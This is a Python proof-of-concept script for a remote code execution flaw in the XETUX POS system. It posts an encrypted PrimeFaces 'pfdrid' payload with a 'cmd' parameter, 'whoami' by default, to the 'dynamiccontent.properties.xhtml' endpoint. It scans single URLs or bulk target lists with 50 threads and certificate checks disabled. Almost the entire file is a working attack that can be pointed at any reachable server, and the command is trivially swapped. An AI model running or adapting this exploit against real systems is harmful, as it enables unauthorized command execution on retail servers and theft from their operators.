import requests
import argparse
from multiprocessing.dummy import Pool
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()


def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def check(target):
    url = f"{target}/xc-one-pos/javax.faces.resource/dynamiccontent.properties.xhtml"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {
    'pfdrt':'sc',
    'ln':'primefaces',
    'pfdrid':'4xE5s8AClZxUxmyaZjpBstMXUalIgOJHOtvxel/v4YXvibdOn52ow4M6lDaKd9Gb8JdQqbACZNWVZpVS+3sX1Hoizouty1mYYT4yJsKPnUZ0LUHDvN0GB5YLgX1PkNY+1ZQ/nOSg5J1LDyzAjBheAxLDODIVcHkmJ6hnJsQ0YQ8bMU5++TqeD4BGqCZMDjP+ZQvveiUhxsUC/+tPqnOgFSBV8TBjDSPNmVoQ9YcKTGelKuJjS2kCXHjcyz7PcQksSW6UUmKu9RhJ+x3Mnx6j56eroVPWnM2vdYRt5An6cLo1YPXu9uqriyg1wgm/7xYP/UwP1q8wfVeyM4fOw2xJzP6i1q4VLHLXi0VYHAIgaPrZ8gH8XH4X2Kq6ewyrJ62QxBF5dtE3tvLAL5tpGxqek5VW+hZFe9ePu0n5tLxWmqgqni8bKGbGrGu4IhXhCJhBxyelLQzPGLCfqmiQwYX5Ime9EHj1k5eoWQzH8jb3kQfFJ0exVprGCfXKGfHyfKfLEOd86anNsiQeNavNL7cDKV0yMbz52n6WLQrCAyzulE8kBCZPNGIUJh24npbeaHTaCjHRDtI7aIPHAIhuMWn7Ef5TU9DcXjdJvZqrItJoCDrtxMFfDhb0hpNQ2ise+bYIYzUDkUtdRV+jCGNI9kbPG5QPhAqp/JBhQ+XsqIhsu4LfkGbt51STsbVQZvoNaNyukOBL5IDTfNY6wS5bPSOKGuFjsQq0Xoadx1t3fc1YA9pm/EWgyR5DdKtmmxG93QqNhZf2RlPRJ5Z3jQAtdxw+xBgj6mLY2bEJUZn4R75UWnvLO6JM918jHdfPZELAxOCrzk5MNuoNxsWreDM7e2GX2iTUpfzNILoGaBY5wDnRw46ATxhx6Q/Eba5MU7vNX1VtGFfHd2cDM5cpSGOlmOMl8qzxYk1R+A2eBUMEl8tFa55uwr19mW9VvWatD8orEb1RmByeIFyUeq6xLszczsB5Sy85Y1KPNvjmbTKu0LryGUc3U8VQ7AudToBsIo9ofMUJAwELNASNfLV0fZvUWi0GjoonpBq5jqSrRHuERB1+DW2kR6XmnuDdZMt9xdd1BGi1AM3As0KwSetNq6Ezm2fnjpW877buqsB+czxMtn6Yt6l88NRYaMHrwuY7s4IMNEBEazc0IBUNF30PH+3eIqRZdkimo980HBzVW4SXHnCMST65/TaIcy6/OXQqNjpMh7DDEQIvDjnMYMyBILCOCSDS4T3JQzgc+VhgT97imje/KWibF70yMQesNzOCEkaZbKoHz498sqKIDRIHiVEhTZlwdP29sUwt1uqNEV/35yQ+O8DLt0b+jqBECHJzI1IhGvSUWJW37TAgUEnJWpjI9R1hT88614GsVDG0UYv0u8YyS0chh0RryV3BXotoSkSkVGShIT4h0s51Qjswp0luewLtNuVyC5FvHvWiHLzbAArNnmM7k/GdCn3jLe9PeJp7yqDzzBBMN9kymtJdlm7c5XnlOv+P7wIJbP0i4+QF+PXw5ePKwSwQ9v8rTQ==',
    'cmd':'whoami'
    }
    try:
        response = requests.post(url=url, data=data, headers=headers, verify=False, timeout=10)
        print(response.text)
        if response.status_code == 200:

            print(f"[*] {target} Is Vulnerable")
        else:
            print(f"[!] {target} Not Vulnerable")
    except requests.exceptions.RequestException as e:
        print(f"[Error] {target} {e}")

def main():
    parse = argparse.ArgumentParser(description="XETUX 系统 dynamiccontent.properties.xhtml 远程代码执行漏洞检测")
    parse.add_argument('-u', '--url', dest='url', type=str, help='输入url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='输入url文件')
    args = parse.parse_args()
    pool = Pool(50)
    targets = []

    if args.url:
        if is_valid_url(args.url):
            targets.append(args.url)

        else:
            target = f"http://{args.url}"
            if is_valid_url(target):
                targets.append(target)
            else:
                print("[ERROR] url格式错误")
                return

    elif args.file:
        try:
            with open(args.file, 'r') as f:
                for line in f:
                    target = line.strip()
                    if is_valid_url(target):
                        targets.append(target)
                    else:
                        target = f"http://{target}"
                        if is_valid_url(target):
                            targets.append(target)
                        else:
                            print(f"[ERROR] url格式错误: {line.strip()}")
        except FileNotFoundError:
            print("[ERROR] 文件未找到")
            return
        except Exception as e:
            print(f"[ERROR] 读取文件时出错: {e}")
            return
    results = pool.map(check, targets)
    pool.close()
    pool.join()



if __name__ == '__main__':
    main()